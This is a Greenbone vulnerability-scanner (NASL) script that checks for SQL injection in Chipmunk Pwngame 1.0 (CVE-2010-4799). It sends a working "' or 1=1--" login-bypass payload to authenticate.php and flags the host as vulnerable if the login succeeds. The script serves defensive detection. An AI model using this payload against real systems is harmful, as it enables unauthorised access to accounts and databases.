if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902368" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)" );
	script_cve_id( "CVE-2010-4799" );
	script_bugtraq_id( 43906 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Chipmunk Pwngame Multiple SQL Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/41760/" );
	script_xref( name: "URL", value: "http://securityreason.com/exploitalert/9240" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "Input passed via the 'username' parameter to 'authenticate.php'
  and 'ID' parameter to 'pwn.php' is not properly sanitised before being used in an SQL query." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Chipmunk Pwngame and is prone multiple SQL
  injection vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to access or
  modify data, or exploit latent vulnerabilities in the underlying database or bypass the log-in mechanism." );
	script_tag( name: "affected", value: "Chipmunk Pwngame version 1.0." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/pwngame", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/pwn.php" ), port: port );
	if(ContainsString( res, ">Chipmunk Scripts<" )){
		filename = dir + "/authenticate.php";
		host = http_host_name( port: port );
		authVariables = "username=%27+or+1%3D1--+-H4x0reSEC&password=%27+or+1%3D1--" + "+-H4x0reSEC&submit=submit";
		req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded", "\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">Thanks for logging in" ) && ContainsString( res, ">Main player Page<" )){
			report = http_report_vuln_url( port: port, url: filename );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

